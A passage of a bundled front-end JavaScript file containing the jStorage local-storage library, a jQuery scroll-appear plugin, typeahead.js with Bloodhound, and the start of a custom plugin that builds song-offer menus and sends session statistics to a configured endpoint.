                s(n, "updated");
                s(e, "deleted")
            }
        }, 25)
    }

    function s(a, b) {
        a = [].concat(a || []);
        var c, k, d, n;
        if ("flushed" == b) {
            a = [];
            for (c in m) m.hasOwnProperty(c) && a.push(c);
            b = "deleted"
        }
        c = 0;
        for (d = a.length; c < d; c++) {
            if (m[a[c]])
                for (k = 0, n = m[a[c]].length; k < n; k++) m[a[c]][k](a[c], b);
            if (m["*"])
                for (k = 0, n = m["*"].length; k < n; k++) m["*"][k](a[c], b)
        }
    }

    function v() {
        var a = (+new Date).toString();
        if ("localStorage" == f || "globalStorage" == f) try {
            h.jStorage_update = a
        } catch (b) {
            f = !1
        } else "userDataBehavior" == f && (g.setAttribute("jStorage_update", a), g.save("jStorage"));
        u()
    }

    function D() {
        if (h.jStorage) try {
            c = p.parse(String(h.jStorage))
        } catch (a) {
            h.jStorage = "{}"
        } else h.jStorage = "{}";
        z = h.jStorage ? String(h.jStorage).length : 0;
        c.__jstorage_meta || (c.__jstorage_meta = {});
        c.__jstorage_meta.CRC32 || (c.__jstorage_meta.CRC32 = {})
    }

    function w() {
        if (c.__jstorage_meta.PubSub) {
            for (var a = +new Date - 2E3, b = 0, l = c.__jstorage_meta.PubSub.length; b <
            l; b++)
                if (c.__jstorage_meta.PubSub[b][0] <= a) {
                    c.__jstorage_meta.PubSub.splice(b, c.__jstorage_meta.PubSub.length - b);
                    break
                }
            c.__jstorage_meta.PubSub.length || delete c.__jstorage_meta.PubSub
        }
        try {
            h.jStorage = p.stringify(c), g && (g.setAttribute("jStorage", h.jStorage), g.save("jStorage")), z = h.jStorage ? String(h.jStorage).length : 0
        } catch (k) {}
    }

    function q(a) {
        if ("string" != typeof a && "number" != typeof a) throw new TypeError("Key name must be string or numeric");
        if ("__jstorage_meta" == a) throw new TypeError("Reserved key name");
        return !0
    }

    function x() {
        var a, b, l, k, d = Infinity,
            n = !1,
            e = [];
        clearTimeout(G);
        if (c.__jstorage_meta && "object" == typeof c.__jstorage_meta.TTL) {
            a = +new Date;
            l = c.__jstorage_meta.TTL;
            k = c.__jstorage_meta.CRC32;
            for (b in l) l.hasOwnProperty(b) && (l[b] <= a ? (delete l[b], delete k[b], delete c[b], n = !0, e.push(b)) : l[b] < d && (d = l[b]));
            Infinity != d && (G = setTimeout(x, Math.min(d - a, 2147483647)));
            n && (w(), v(), s(e, "deleted"))
        }
    }

    function E() {
        var a;
        if (c.__jstorage_meta.PubSub) {
            var b, l = A,
                k = [];
            for (a = c.__jstorage_meta.PubSub.length - 1; 0 <= a; a--) b =
                c.__jstorage_meta.PubSub[a], b[0] > A && (l = b[0], k.unshift(b));
            for (a = k.length - 1; 0 <= a; a--) {
                b = k[a][1];
                var d = k[a][2];
                if (t[b])
                    for (var n = 0, e = t[b].length; n < e; n++) try {
                        t[b][n](b, p.parse(p.stringify(d)))
                    } catch (g) {}
            }
            A = l
        }
    }
    var y = window.jQuery || window.$ || (window.$ = {}),
        p = {
            parse: window.JSON && (window.JSON.parse || window.JSON.decode) || String.prototype.evalJSON && function(a) {
                return String(a).evalJSON()
            } || y.parseJSON || y.evalJSON,
            stringify: Object.toJSON || window.JSON && (window.JSON.stringify || window.JSON.encode) || y.toJSON
        };
    if ("function" !==
        typeof p.parse || "function" !== typeof p.stringify) throw Error("No JSON support found, include //cdnjs.cloudflare.com/ajax/libs/json2/20110223/json2.js to page");
    var c = {
            __jstorage_meta: {
                CRC32: {}
            }
        },
        h = {
            jStorage: "{}"
        },
        g = null,
        z = 0,
        f = !1,
        m = {},
        F = !1,
        r = 0,
        t = {},
        A = +new Date,
        G, B = {
            isXML: function(a) {
                return (a = (a ? a.ownerDocument || a : 0).documentElement) ? "HTML" !== a.nodeName : !1
            },
            encode: function(a) {
                if (!this.isXML(a)) return !1;
                try {
                    return (new XMLSerializer).serializeToString(a)
                } catch (b) {
                    try {
                        return a.xml
                    } catch (c) {}
                }
                return !1
            },
            decode: function(a) {
                var b = "DOMParser" in window && (new DOMParser).parseFromString || window.ActiveXObject && function(a) {
                        var b = new ActiveXObject("Microsoft.XMLDOM");
                        b.async = "false";
                        b.loadXML(a);
                        return b
                    };
                if (!b) return !1;
                a = b.call("DOMParser" in window && new DOMParser || window, a, "text/xml");
                return this.isXML(a) ? a : !1
            }
        };
    y.jStorage = {
        version: "0.4.12",
        set: function(a, b, l) {
            q(a);
            l = l || {};
            if ("undefined" == typeof b) return this.deleteKey(a), b;
            if (B.isXML(b)) b = {
                _is_xml: !0,
                xml: B.encode(b)
            };
            else {
                if ("function" == typeof b) return;
                b && "object" == typeof b && (b = p.parse(p.stringify(b)))
            }
            c[a] = b;
            for (var k = c.__jstorage_meta.CRC32, d = p.stringify(b), g = d.length, e = 2538058380 ^ g, h = 0, f; 4 <= g;) f = d.charCodeAt(h) & 255 | (d.charCodeAt(++h) & 255) << 8 | (d.charCodeAt(++h) & 255) << 16 | (d.charCodeAt(++h) & 255) << 24, f = 1540483477 * (f & 65535) + ((1540483477 * (f >>> 16) & 65535) << 16), f ^= f >>> 24, f = 1540483477 * (f & 65535) + ((1540483477 * (f >>> 16) & 65535) << 16), e = 1540483477 * (e & 65535) + ((1540483477 * (e >>> 16) & 65535) << 16) ^ f, g -= 4, ++h;
            switch (g) {
                case 3:
                    e ^= (d.charCodeAt(h + 2) & 255) << 16;
                case 2:
                    e ^=
                        (d.charCodeAt(h + 1) & 255) << 8;
                case 1:
                    e ^= d.charCodeAt(h) & 255, e = 1540483477 * (e & 65535) + ((1540483477 * (e >>> 16) & 65535) << 16)
            }
            e ^= e >>> 13;
            e = 1540483477 * (e & 65535) + ((1540483477 * (e >>> 16) & 65535) << 16);
            k[a] = "2." + ((e ^ e >>> 15) >>> 0);
            this.setTTL(a, l.TTL || 0);
            s(a, "updated");
            return b
        },
        get: function(a, b) {
            q(a);
            return a in c ? c[a] && "object" == typeof c[a] && c[a]._is_xml ? B.decode(c[a].xml) : c[a] : "undefined" == typeof b ? null : b
        },
        deleteKey: function(a) {
            q(a);
            return a in c ? (delete c[a], "object" == typeof c.__jstorage_meta.TTL && a in c.__jstorage_meta.TTL &&
            delete c.__jstorage_meta.TTL[a], delete c.__jstorage_meta.CRC32[a], w(), v(), s(a, "deleted"), !0) : !1
        },
        setTTL: function(a, b) {
            var l = +new Date;
            q(a);
            b = Number(b) || 0;
            return a in c ? (c.__jstorage_meta.TTL || (c.__jstorage_meta.TTL = {}), 0 < b ? c.__jstorage_meta.TTL[a] = l + b : delete c.__jstorage_meta.TTL[a], w(), x(), v(), !0) : !1
        },
        getTTL: function(a) {
            var b = +new Date;
            q(a);
            return a in c && c.__jstorage_meta.TTL && c.__jstorage_meta.TTL[a] ? (a = c.__jstorage_meta.TTL[a] - b) || 0 : 0
        },
        flush: function() {
            c = {
                __jstorage_meta: {
                    CRC32: {}
                }
            };
            w();
            v();
            s(null,
                "flushed");
            return !0
        },
        storageObj: function() {
            function a() {}
            a.prototype = c;
            return new a
        },
        index: function() {
            var a = [],
                b;
            for (b in c) c.hasOwnProperty(b) && "__jstorage_meta" != b && a.push(b);
            return a
        },
        storageSize: function() {
            return z
        },
        currentBackend: function() {
            return f
        },
        storageAvailable: function() {
            return !!f
        },
        listenKeyChange: function(a, b) {
            q(a);
            m[a] || (m[a] = []);
            m[a].push(b)
        },
        stopListening: function(a, b) {
            q(a);
            if (m[a])
                if (b)
                    for (var c = m[a].length - 1; 0 <= c; c--) m[a][c] == b && m[a].splice(c, 1);
                else delete m[a]
        },
        subscribe: function(a,
                            b) {
            a = (a || "").toString();
            if (!a) throw new TypeError("Channel not defined");
            t[a] || (t[a] = []);
            t[a].push(b)
        },
        publish: function(a, b) {
            a = (a || "").toString();
            if (!a) throw new TypeError("Channel not defined");
            c.__jstorage_meta || (c.__jstorage_meta = {});
            c.__jstorage_meta.PubSub || (c.__jstorage_meta.PubSub = []);
            c.__jstorage_meta.PubSub.unshift([+new Date, a, b]);
            w();
            v()
        },
        reInit: function() {
            C()
        },
        noConflict: function(a) {
            delete window.$.jStorage;
            a && (window.jStorage = this);
            return this
        }
    };
    (function() {
        var a = !1;
        if ("localStorage" in
            window) try {
            window.localStorage.setItem("_tmptest", "tmpval"), a = !0, window.localStorage.removeItem("_tmptest")
        } catch (b) {}
        if (a) try {
            window.localStorage && (h = window.localStorage, f = "localStorage", r = h.jStorage_update)
        } catch (c) {} else if ("globalStorage" in window) try {
            window.globalStorage && (h = "localhost" == window.location.hostname ? window.globalStorage["localhost.localdomain"] : window.globalStorage[window.location.hostname], f = "globalStorage", r = h.jStorage_update)
        } catch (k) {} else if (g = document.createElement("link"),
                g.addBehavior) {
            g.style.behavior = "url(#default#userData)";
            document.getElementsByTagName("head")[0].appendChild(g);
            try {
                g.load("jStorage")
            } catch (d) {
                g.setAttribute("jStorage", "{}"), g.save("jStorage"), g.load("jStorage")
            }
            a = "{}";
            try {
                a = g.getAttribute("jStorage")
            } catch (m) {}
            try {
                r = g.getAttribute("jStorage_update")
            } catch (e) {}
            h.jStorage = a;
            f = "userDataBehavior"
        } else {
            g = null;
            return
        }
        D();
        x();
        "localStorage" == f || "globalStorage" == f ? "addEventListener" in window ? window.addEventListener("storage", u, !1) : document.attachEvent("onstorage",
            u) : "userDataBehavior" == f && setInterval(u, 1E3);
        E();
        "addEventListener" in window && window.addEventListener("pageshow", function(a) {
            a.persisted && u()
        }, !1)
    })()
})();
! function(e) {
    function r() {
        o = !1;
        for (var r = 0, t = i.length; t > r; r++) {
            var n = e(i[r]).filter(function() {
                return e(this).is(":appeared")
            });
            if (n.trigger("appear", [n]), p[r]) {
                var a = p[r].not(n);
                a.trigger("disappear", [a])
            }
            p[r] = n
        }
    }

    function t(e) {
        i.push(e), p.push()
    }
    var i = [],
        n = !1,
        o = !1,
        a = {
            interval: 250,
            force_process: !1
        },
        f = e(window),
        p = [];
    e.expr[":"].appeared = function(r) {
        var t = e(r);
        if (!t.is(":visible")) return !1;
        var i = f.scrollLeft(),
            n = f.scrollTop(),
            o = t.offset(),
            a = o.left,
            p = o.top;
        return p + t.height() >= n && p - (t.data("appear-top-offset") || 0) <= n + f.height() && a + t.width() >= i && a - (t.data("appear-left-offset") || 0) <= i + f.width() ? !0 : !1
    }, e.fn.extend({
        appear: function(i) {
            var f = e.extend({}, a, i || {}),
                p = this.selector || this;
            if (!n) {
                var u = function() {
                    o || (o = !0, setTimeout(r, f.interval))
                };
                e(window).scroll(u).resize(u), n = !0
            }
            return f.force_process && setTimeout(r, f.interval), t(p), e(p)
        }
    }), e.extend({
        force_appear: function() {
            return n ? (r(), !0) : !1
        }
    })
}(function() {
    return "undefined" != typeof module ? require("jquery") : jQuery
}());
/*!
 * typeahead.js 0.10.5
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

! function(a) {
    var b = function() {
            "use strict";
            return {
                isMsie: function() {
                    return /(msie|trident)/i.test(navigator.userAgent) ? navigator.userAgent.match(/(msie |rv:)(\d+(.\d+)?)/i)[2] : !1
                },
                isBlankString: function(a) {
                    return !a || /^\s*$/.test(a)
                },
                escapeRegExChars: function(a) {
                    return a.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&")
                },
                isString: function(a) {
                    return "string" == typeof a
                },
                isNumber: function(a) {
                    return "number" == typeof a
                },
                isArray: a.isArray,
                isFunction: a.isFunction,
                isObject: a.isPlainObject,
                isUndefined: function(a) {
                    return "undefined" == typeof a
                },
                toStr: function(a) {
                    return b.isUndefined(a) || null === a ? "" : a + ""
                },
                bind: a.proxy,
                each: function(b, c) {
                    function d(a, b) {
                        return c(b, a)
                    }
                    a.each(b, d)
                },
                map: a.map,
                filter: a.grep,
                every: function(b, c) {
                    var d = !0;
                    return b ? (a.each(b, function(a, e) {
                        return (d = c.call(null, e, a, b)) ? void 0 : !1
                    }), !!d) : d
                },
                some: function(b, c) {
                    var d = !1;
                    return b ? (a.each(b, function(a, e) {
                        return (d = c.call(null, e, a, b)) ? !1 : void 0
                    }), !!d) : d
                },
                mixin: a.extend,
                getUniqueId: function() {
                    var a = 0;
                    return function() {
                        return a++
                    }
                }(),
                templatify: function(b) {
                    function c() {
                        return String(b)
                    }
                    return a.isFunction(b) ? b : c
                },
                defer: function(a) {
                    setTimeout(a, 0)
                },
                debounce: function(a, b, c) {
                    var d, e;
                    return function() {
                        var f, g, h = this,
                            i = arguments;
                        return f = function() {
                            d = null, c || (e = a.apply(h, i))
                        }, g = c && !d, clearTimeout(d), d = setTimeout(f, b), g && (e = a.apply(h, i)), e
                    }
                },
                throttle: function(a, b) {
                    var c, d, e, f, g, h;
                    return g = 0, h = function() {
                        g = new Date, e = null, f = a.apply(c, d)
                    },
                        function() {
                            var i = new Date,
                                j = b - (i - g);
                            return c = this, d = arguments, 0 >= j ? (clearTimeout(e), e = null, g = i, f = a.apply(c, d)) : e || (e = setTimeout(h, j)), f
                        }
                },
                noop: function() {}
            }
        }(),
        c = "0.10.5",
        d = function() {
            "use strict";

            function a(a) {
                return a = b.toStr(a), a ? a.split(/\s+/) : []
            }

            function c(a) {
                return a = b.toStr(a), a ? a.split(/\W+/) : []
            }

            function d(a) {
                return function() {
                    var c = [].slice.call(arguments, 0);
                    return function(d) {
                        var e = [];
                        return b.each(c, function(c) {
                            e = e.concat(a(b.toStr(d[c])))
                        }), e
                    }
                }
            }
            return {
                nonword: c,
                whitespace: a,
                obj: {
                    nonword: d(c),
                    whitespace: d(a)
                }
            }
        }(),
        e = function() {
            "use strict";

            function c(c) {
                this.maxSize = b.isNumber(c) ? c : 100, this.reset(), this.maxSize <= 0 && (this.set = this.get = a.noop)
            }

            function d() {
                this.head = this.tail = null
            }

            function e(a, b) {
                this.key = a, this.val = b, this.prev = this.next = null
            }
            return b.mixin(c.prototype, {
                set: function(a, b) {
                    var c, d = this.list.tail;
                    this.size >= this.maxSize && (this.list.remove(d), delete this.hash[d.key]), (c = this.hash[a]) ? (c.val = b, this.list.moveToFront(c)) : (c = new e(a, b), this.list.add(c), this.hash[a] = c, this.size++)
                },
                get: function(a) {
                    var b = this.hash[a];
                    return b ? (this.list.moveToFront(b), b.val) : void 0
                },
                reset: function() {
                    this.size = 0, this.hash = {}, this.list = new d
                }
            }), b.mixin(d.prototype, {
                add: function(a) {
                    this.head && (a.next = this.head, this.head.prev = a), this.head = a, this.tail = this.tail || a
                },
                remove: function(a) {
                    a.prev ? a.prev.next = a.next : this.head = a.next, a.next ? a.next.prev = a.prev : this.tail = a.prev
                },
                moveToFront: function(a) {
                    this.remove(a), this.add(a)
                }
            }), c
        }(),
        f = function() {
            "use strict";

            function a(a) {
                this.prefix = ["__", a, "__"].join(""), this.ttlKey = "__ttl__", this.keyMatcher = new RegExp("^" + b.escapeRegExChars(this.prefix))
            }

            function c() {
                return (new Date).getTime()
            }

            function d(a) {
                return JSON.stringify(b.isUndefined(a) ? null : a)
            }

            function e(a) {
                return JSON.parse(a)
            }
            var f, g;
            try {
                f = window.localStorage, f.setItem("~~~", "!"), f.removeItem("~~~")
            } catch (h) {
                f = null
            }
            return g = f && window.JSON ? {
                _prefix: function(a) {
                    return this.prefix + a
                },
                _ttlKey: function(a) {
                    return this._prefix(a) + this.ttlKey
                },
                get: function(a) {
                    return this.isExpired(a) && this.remove(a), e(f.getItem(this._prefix(a)))
                },
                set: function(a, e, g) {
                    return b.isNumber(g) ? f.setItem(this._ttlKey(a), d(c() + g)) : f.removeItem(this._ttlKey(a)), f.setItem(this._prefix(a), d(e))
                },
                remove: function(a) {
                    return f.removeItem(this._ttlKey(a)), f.removeItem(this._prefix(a)), this
                },
                clear: function() {
                    var a, b, c = [],
                        d = f.length;
                    for (a = 0; d > a; a++)(b = f.key(a)).match(this.keyMatcher) && c.push(b.replace(this.keyMatcher, ""));
                    for (a = c.length; a--;) this.remove(c[a]);
                    return this
                },
                isExpired: function(a) {
                    var d = e(f.getItem(this._ttlKey(a)));
                    return b.isNumber(d) && c() > d ? !0 : !1
                }
            } : {
                get: b.noop,
                set: b.noop,
                remove: b.noop,
                clear: b.noop,
                isExpired: b.noop
            }, b.mixin(a.prototype, g), a
        }(),
        g = function() {
            "use strict";

            function c(b) {
                b = b || {}, this.cancelled = !1, this.lastUrl = null, this._send = b.transport ? d(b.transport) : a.ajax, this._get = b.rateLimiter ? b.rateLimiter(this._get) : this._get, this._cache = b.cache === !1 ? new e(0) : i
            }

            function d(c) {
                return function(d, e) {
                    function f(a) {
                        b.defer(function() {
                            h.resolve(a)
                        })
                    }

                    function g(a) {
                        b.defer(function() {
                            h.reject(a)
                        })
                    }
                    var h = a.Deferred();
                    return c(d, e, f, g), h
                }
            }
            var f = 0,
                g = {},
                h = 6,
                i = new e(10);
            return c.setMaxPendingRequests = function(a) {
                h = a
            }, c.resetCache = function() {
                i.reset()
            }, b.mixin(c.prototype, {
                _get: function(a, b, c) {
                    function d(b) {
                        c && c(null, b), k._cache.set(a, b)
                    }

                    function e() {
                        c && c(!0)
                    }

                    function i() {
                        f--, delete g[a], k.onDeckRequestArgs && (k._get.apply(k, k.onDeckRequestArgs), k.onDeckRequestArgs = null)
                    }
                    var j, k = this;
                    this.cancelled || a !== this.lastUrl || ((j = g[a]) ? j.done(d).fail(e) : h > f ? (f++, g[a] = this._send(a, b).done(d).fail(e).always(i)) : this.onDeckRequestArgs = [].slice.call(arguments, 0))
                },
                get: function(a, c, d) {
                    var e;
                    return b.isFunction(c) && (d = c, c = {}), this.cancelled = !1, this.lastUrl = a, (e = this._cache.get(a)) ? b.defer(function() {
                        d && d(null, e)
                    }) : this._get(a, c, d), !!e
                },
                cancel: function() {
                    this.cancelled = !0
                }
            }), c
        }(),
        h = function() {
            "use strict";

            function c(b) {
                b = b || {}, b.datumTokenizer && b.queryTokenizer || a.error("datumTokenizer and queryTokenizer are both required"), this.datumTokenizer = b.datumTokenizer, this.queryTokenizer = b.queryTokenizer, this.reset()
            }

            function d(a) {
                return a = b.filter(a, function(a) {
                    return !!a
                }), a = b.map(a, function(a) {
                    return a.toLowerCase()
                })
            }

            function e() {
                return {
                    ids: [],
                    children: {}
                }
            }

            function f(a) {
                for (var b = {}, c = [], d = 0, e = a.length; e > d; d++) b[a[d]] || (b[a[d]] = !0, c.push(a[d]));
                return c
            }

            function g(a, b) {
                function c(a, b) {
                    return a - b
                }
                var d = 0,
                    e = 0,
                    f = [];
                a = a.sort(c), b = b.sort(c);
                for (var g = a.length, h = b.length; g > d && h > e;) a[d] < b[e] ? d++ : a[d] > b[e] ? e++ : (f.push(a[d]), d++, e++);
                return f
            }
            return b.mixin(c.prototype, {
                bootstrap: function(a) {
                    this.datums = a.datums, this.trie = a.trie
                },
                add: function(a) {
                    var c = this;
                    a = b.isArray(a) ? a : [a], b.each(a, function(a) {
                        var f, g;
                        f = c.datums.push(a) - 1, g = d(c.datumTokenizer(a)), b.each(g, function(a) {
                            var b, d, g;
                            for (b = c.trie, d = a.split(""); g = d.shift();) b = b.children[g] || (b.children[g] = e()), b.ids.push(f)
                        })
                    })
                },
                get: function(a) {
                    var c, e, h = this;
                    return c = d(this.queryTokenizer(a)), b.each(c, function(a) {
                        var b, c, d, f;
                        if (e && 0 === e.length) return !1;
                        for (b = h.trie, c = a.split(""); b && (d = c.shift());) b = b.children[d];
                        return b && 0 === c.length ? (f = b.ids.slice(0), void(e = e ? g(e, f) : f)) : (e = [], !1)
                    }), e ? b.map(f(e), function(a) {
                        return h.datums[a]
                    }) : []
                },
                reset: function() {
                    this.datums = [], this.trie = e()
                },
                serialize: function() {
                    return {
                        datums: this.datums,
                        trie: this.trie
                    }
                }
            }), c
        }(),
        i = function() {
            "use strict";

            function d(a) {
                return a.local || null
            }

            function e(d) {
                var e, f;
                return f = {
                    url: null,
                    thumbprint: "",
                    ttl: 864e5,
                    filter: null,
                    ajax: {}
                }, (e = d.prefetch || null) && (e = b.isString(e) ? {
                    url: e
                } : e, e = b.mixin(f, e), e.thumbprint = c + e.thumbprint, e.ajax.type = e.ajax.type || "GET", e.ajax.dataType = e.ajax.dataType || "json", !e.url && a.error("prefetch requires url to be set")), e
            }

            function f(c) {
                function d(a) {
                    return function(c) {
                        return b.debounce(c, a)
                    }
                }

                function e(a) {
                    return function(c) {
                        return b.throttle(c, a)
                    }
                }
                var f, g;
                return g = {
                    url: null,
                    cache: !0,
                    wildcard: "%QUERY",
                    replace: null,
                    rateLimitBy: "debounce",
                    rateLimitWait: 300,
                    send: null,
                    filter: null,
                    ajax: {}
                }, (f = c.remote || null) && (f = b.isString(f) ? {
                    url: f
                } : f, f = b.mixin(g, f), f.rateLimiter = /^throttle$/i.test(f.rateLimitBy) ? e(f.rateLimitWait) : d(f.rateLimitWait), f.ajax.type = f.ajax.type || "GET", f.ajax.dataType = f.ajax.dataType || "json", delete f.rateLimitBy, delete f.rateLimitWait, !f.url && a.error("remote requires url to be set")), f
            }
            return {
                local: d,
                prefetch: e,
                remote: f
            }
        }();
    ! function(c) {
        "use strict";

        function e(b) {
            b && (b.local || b.prefetch || b.remote) || a.error("one of local, prefetch, or remote is required"), this.limit = b.limit || 5, this.sorter = j(b.sorter), this.dupDetector = b.dupDetector || k, this.local = i.local(b), this.prefetch = i.prefetch(b), this.remote = i.remote(b), this.cacheKey = this.prefetch ? this.prefetch.cacheKey || this.prefetch.url : null, this.index = new h({
                datumTokenizer: b.datumTokenizer,
                queryTokenizer: b.queryTokenizer
            }), this.storage = this.cacheKey ? new f(this.cacheKey) : null
        }

        function j(a) {
            function c(b) {
                return b.sort(a)
            }

            function d(a) {
                return a
            }
            return b.isFunction(a) ? c : d
        }

        function k() {
            return !1
        }
        var l, m;
        return l = c.Bloodhound, m = {
            data: "data",
            protocol: "protocol",
            thumbprint: "thumbprint"
        }, c.Bloodhound = e, e.noConflict = function() {
            return c.Bloodhound = l, e
        }, e.tokenizers = d, b.mixin(e.prototype, {
            _loadPrefetch: function(b) {
                function c(a) {
                    f.clear(), f.add(b.filter ? b.filter(a) : a), f._saveToStorage(f.index.serialize(), b.thumbprint, b.ttl)
                }
                var d, e, f = this;
                return (d = this._readFromStorage(b.thumbprint)) ? (this.index.bootstrap(d), e = a.Deferred().resolve()) : e = a.ajax(b.url, b.ajax).done(c), e
            },
            _getFromRemote: function(a, b) {
                function c(a, c) {
                    b(a ? [] : f.remote.filter ? f.remote.filter(c) : c)
                }
                var d, e, f = this;
                if (this.transport) return a = a || "", e = encodeURIComponent(a), d = this.remote.replace ? this.remote.replace(this.remote.url, a) : this.remote.url.replace(this.remote.wildcard, e), this.transport.get(d, this.remote.ajax, c)
            },
            _cancelLastRemoteRequest: function() {
                this.transport && this.transport.cancel()
            },
            _saveToStorage: function(a, b, c) {
                this.storage && (this.storage.set(m.data, a, c), this.storage.set(m.protocol, location.protocol, c), this.storage.set(m.thumbprint, b, c))
            },
            _readFromStorage: function(a) {
                var b, c = {};
                return this.storage && (c.data = this.storage.get(m.data), c.protocol = this.storage.get(m.protocol), c.thumbprint = this.storage.get(m.thumbprint)), b = c.thumbprint !== a || c.protocol !== location.protocol, c.data && !b ? c.data : null
            },
            _initialize: function() {
                function c() {
                    e.add(b.isFunction(f) ? f() : f)
                }
                var d, e = this,
                    f = this.local;
                return d = this.prefetch ? this._loadPrefetch(this.prefetch) : a.Deferred().resolve(), f && d.done(c), this.transport = this.remote ? new g(this.remote) : null, this.initPromise = d.promise()
            },
            initialize: function(a) {
                return !this.initPromise || a ? this._initialize() : this.initPromise
            },
            add: function(a) {
                this.index.add(a)
            },
            get: function(a, c) {
                function d(a) {
                    var d = f.slice(0);
                    b.each(a, function(a) {
                        var c;
                        return c = b.some(d, function(b) {
                            return e.dupDetector(a, b)
                        }), !c && d.push(a), d.length < e.limit
                    }), c && c(e.sorter(d))
                }
                var e = this,
                    f = [],
                    g = !1;
                f = this.index.get(a), f = this.sorter(f).slice(0, this.limit), f.length < this.limit ? g = this._getFromRemote(a, d) : this._cancelLastRemoteRequest(), g || (f.length > 0 || !this.transport) && c && c(f)
            },
            clear: function() {
                this.index.reset()
            },
            clearPrefetchCache: function() {
                this.storage && this.storage.clear()
            },
            clearRemoteCache: function() {
                this.transport && g.resetCache()
            },
            ttAdapter: function() {
                return b.bind(this.get, this)
            }
        }), e
    }(this)
}(window.jQuery);
! function(b) {
    function m(a, b) {
        return b && "object" == typeof a ? a.songArtist : "object" == typeof a ? a.songName : a
    }

    function n(a) {
        for (var b = 0; b < a.selectMenuOffer.contentList.length; b++)
            for (var c = b + 1; c < a.selectMenuOffer.contentList.length; c++) a.selectMenuOffer.contentList[b].id === a.selectMenuOffer.contentList[c].id && (a.selectMenuOffer.contentList.splice(c, 1), c--)
    }

    function o(a) {
        var b = !1;
        for (var c in a.selectMenuOffer.extraList) {
            for (var d in a.selectMenuOffer.contentList)
                if (a.selectMenuOffer.extraList[c].id === a.selectMenuOffer.contentList[d].rbtCode || a.selectMenuOffer.extraList[c].id === a.selectMenuOffer.contentList[d].rbtTBCode) {
                    b = !0, a.selectMenuOffer.responseCode || (a.selectMenuOffer.responseCode = {
                        id: d,
                        rbtTBCode: a.selectMenuOffer.extraList[c].id
                    });
                    break
                }
            b && (a.selectMenuOffer.extraList.splice(c, 1), b = !1)
        }
    }

    function p(a, c) {
        n(a), o(a);
        var d, e = b("<div/>").attr("class", a.selectMenuOffer.name),
            f = Math.round(Math.random() * (a.selectMenuOffer.contentList.length - 1)),
            g = b("<p/>").text(a.selectMenuOffer.contentListText),
            h = b("<select/>");
        if (a.selectMenuOffer.extraList.length > 0 ? h.attr("default", a.selectMenuOffer.extraList[0].id) : a.selectMenuOffer.responseCode ? h.attr("default", a.selectMenuOffer.responseCode.rbtTBCode) : h.attr("default", a.selectMenuOffer.contentList[f].rbtTBCode), h.width(a.selectMenuOffer.selectWidth), a.selectMenuOffer.extraList.length > 0)
            for (var i in a.selectMenuOffer.extraList) d = b("<option/>").attr("value", a.selectMenuOffer.extraList[i].id), d.append(a.selectMenuOffer.extraList[i].value), 0 === parseInt(i) && d.attr("selected", "selected"), h.append(d);
        for (var i in a.selectMenuOffer.contentList) d = b("<option/>").attr("value", a.selectMenuOffer.contentList[i].rbtTBCode), d.append(a.selectMenuOffer.contentList[i].artist + " - " + a.selectMenuOffer.contentList[i].name), a.selectMenuOffer.responseCode ? parseInt(i) === parseInt(a.selectMenuOffer.responseCode.id) && d.attr("selected", "selected") : parseInt(i) === f && 0 === a.selectMenuOffer.extraList.length && d.attr("selected", "selected"), h.append(d);
        return a.selectMenuOffer.element = h, c && e.css(a.selectMenuOffer.selectMenuCss), e.append(g), e.append(h), e
    }

    function q(a) {
        var d, e, b = decodeURIComponent(window.location.search.substring(1)),
            c = b.split("&");
        for (e = 0; e < c.length; e++)
            if (d = c[e].split("="), d[0] === a) return void 0 === d[1] ? !0 : d[1]
    }

    function s(a, b, c) {
        var d;
        if (c) {
            var e = new Date;
            e.setTime(e.getTime() + 24 * c * 60 * 60 * 1e3), d = "; expires=" + e.toGMTString()
        } else d = "";
        document.cookie = a + "=" + b + d + "; path=/"
    }

    function t(a) {
        return document.cookie.length > 0 && (c_start = document.cookie.indexOf(a + "="), -1 != c_start) ? (c_start = c_start + a.length + 1, c_end = document.cookie.indexOf(";", c_start), -1 == c_end && (c_end = document.cookie.length), unescape(document.cookie.substring(c_start, c_end))) : ""
    }

    function u() {
        function a() {
            return Math.floor(65536 * (1 + Math.random())).toString(16).substring(1)
        }
        return a() + a() + "-" + a() + "-" + a() + "-" + a() + "-" + a() + a() + a()
    }

    function v(a) {
        return null !== k ? k : (k = t(a.sessionCookieName), "" == k && (k = u(), s(a.sessionCookieName, k, a.sessionCookiePeriod)), k)
    }

    function w(a, b, c) {
        return E(a.statsUrl, {
            extra: a.extra,
            partner: a.partner,
            session_id: v(a),
            message: b
        }, c, a)
    }

    function x(a, c) {
        var d = b.Deferred(),
            e = y(a);
        return b.ajax({
            url: w(a, c, e),
            cache: !1,
            dataType: z(a.statsUrl, a),
            jsonpCallback: e,
            success: function(a) {
                d.resolve(a)
            }
        }), d.promise()
    }

    function y(a) {
        return a.jsonpCallbackPrefix + Date.now()
    }

    function z(a, b) {
        return a.indexOf(b.jsonpCallbackPrefix) > -1 ? "jsonp" : "json"
    }

    function A(a, c, d) {
        var e = i[a],
            f = null;
        if (e) f = e;
        else {
            var f = b.Deferred();
            i[a] = f, b.ajax({
                url: F(a, c.origName, d, null),
                cache: !1,
                success: function(e) {
                    if (e.data.send_code_url && (d.giftUrl = e.data.send_code_url), e.data.stats_url && (d.statsUrl = e.data.stats_url), e.data.get_operator_url && e.data.operator_group === !1) {
                        d.checkUrl = e.data.get_operator_url;
                        var g = y(d);
                        b.ajax({
                            url: F(a, c.origName, d, null, g),
                            cache: !1,
                            dataType: z(d.checkUrl, d),
                            jsonpCallback: g,
                            success: function(a) {
                                f.resolve(a)
                            }
                        })
                    } else f.resolve(e);
                    return e
                }
            })
        }
        return f.promise()
    }

    function C(a, c, d, e) {
        var f = b.proxy(e, this);
        A(a, c, d).done(function(a) {
            da(a, d) && f && f()
        })
    }

    function D() {
        return res = location.host.replace(/.*\.([^\.]+)\.([^\.]+)$/, "$1$2").replace(/[\,\.\-\_]/g, "") + "_web", res
    }

    function E(a, c, d, e) {
        c || (c = []), e.useHttps && (httpsUrl = a.split("http://"), httpsUrl.length > 1 && (a = "https://" + httpsUrl.pop())), d && (a = a.replace("jQueryId", d)), c.session_id = v(e);
        var f = a.split("?"),
            g = "?";
        return b.each(c, function(b, c) {
            a = a.replace("%%" + b + "%%", encodeURIComponent(c))
        }), a = a.replace(new RegExp("%%[^%]+%%", "g"), ""), f.length > 1 && "" != f[1] && (g = "&"), a + g + b.param(c)
    }

    function F(a, b, c, d, e) {
